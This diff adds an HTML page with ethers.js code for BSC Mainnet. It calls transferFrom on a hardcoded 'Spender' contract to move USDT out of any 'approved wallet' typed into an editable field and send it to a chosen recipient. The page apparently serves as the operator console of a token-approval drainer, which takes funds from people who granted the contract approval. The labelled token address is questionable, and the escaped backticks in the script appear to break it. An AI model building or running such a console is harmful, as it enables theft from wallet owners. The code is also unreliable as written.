@@ -1,0 +1,121 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Transfer USDT via Spender</title>
+  <style>
+    body { font-family: Arial; margin: 24px; max-width: 720px; background: #f7f9fc; color: #111; }
+    .card { background: #fff; border: 1px solid #e6e8ec; border-radius: 10px; padding: 18px; }
+    label { display: block; margin-top: 12px; font-weight: bold; }
+    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; margin-top: 4px; }
+    button { margin-top: 16px; padding: 10px 14px; border: none; border-radius: 8px; background: #0066ff; color: white; font-weight: bold; cursor: pointer; }
+    button:disabled { background: #ccc; cursor: not-allowed; }
+    pre { background: #f3f3f3; padding: 12px; margin-top: 16px; border-radius: 8px; max-height: 300px; overflow: auto; }
+  </style>
+</head>
+
+<body>
+  <h2>Transfer USDT via Spender</h2>
+  <div class="card">
+    <p><b>Network:</b> BSC Mainnet (chainId 56)</p>
+
+    <label>Spender Contract:</label>
+    <input id="spender" value="0xe852fBf71D106960Ff533bd2cDf67e540432d526" readonly>
+
+    <label>USDT Token:</label>
+    <input id="token" value="0xA2CF060B622F28E2F5Ed5FAD0181b711C1ba47C1" readonly>
+
+    <label>From (Approved Wallet):</label>
+    <input id="from" placeholder="0x...">
+
+    <label>To (Recipient):</label>
+    <input id="to" placeholder="0x...">
+
+    <label>Amount (USDT):</label>
+    <input id="amount" placeholder="e.g., 100">
+
+    <button id="connect">Connect Wallet</button>
+    <button id="transfer" disabled>Transfer USDT</button>
+
+    <pre id="log"></pre>
+  </div>
+
+  <!-- Load ethers -->
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+
+  <script>
+    (async function initDApp() {
+      while (typeof window.ethers === "undefined") {
+        await new Promise(r => setTimeout(r, 300));
+      }
+      console.log("Ethers loaded");
+
+      const SPENDER_ABI = [
+        "function transferFrom(address from, address to, uint256 amount) external"
+      ];
+      const ERC20_ABI = [
+        "function decimals() view returns (uint8)"
+      ];
+
+      let provider, signer;
+
+      function log(msg) {
+        const el = document.getElementById("log");
+        el.textContent += msg + "\n";
+        el.scrollTop = el.scrollHeight;
+      }
+
+      async function getProvider() {
+        if (window.ethereum) return new ethers.providers.Web3Provider(window.ethereum);
+        if (window.web3 && window.web3.currentProvider)
+          return new ethers.providers.Web3Provider(window.web3.currentProvider);
+        throw new Error("No Web3 wallet found. Use MetaMask or Trust Wallet.");
+      }
+
+      async function ensureConnected() {
+        provider = await getProvider();
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        const addr = await signer.getAddress();
+        const net = await provider.getNetwork();
+        log(\`Connected: \${addr}\`);
+        if (net.chainId !== 56) log("⚠ Not on BSC Mainnet. Switch to chainId 56.");
+        return addr;
+      }
+
+      document.getElementById('connect').onclick = async () => {
+        try {
+          const addr = await ensureConnected();
+          document.getElementById('from').value = addr;
+          document.getElementById('transfer').disabled = false;
+        } catch(e) { log("Error: " + e.message); }
+      };
+
+      document.getElementById('transfer').onclick = async () => {
+        try {
+          const spenderAddr = document.getElementById('spender').value;
+          const tokenAddr = document.getElementById('token').value;
+          const from = document.getElementById('from').value;
+          const to = document.getElementById('to').value;
+          const amount = document.getElementById('amount').value;
+
+          if (!from || !to || !amount) {
+            return log("⚠ Fill all fields: From, To, Amount");
+          }
+
+          await ensureConnected();
+          const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+          const dec = await token.decimals();
+          const value = ethers.utils.parseUnits(amount, dec);
+
+          const spender = new ethers.Contract(spenderAddr, SPENDER_ABI, signer);
+          const tx = await spender.transferFrom(from, to, value);
+          log("Transfer sent: " + tx.hash);
+          await tx.wait();
+          log("✅ Transfer confirmed!");
+        } catch(e) { log("Transfer failed: " + (e.data?.message || e.message)); }
+      };
+    })();
+  </script>
+</body>
+</html>
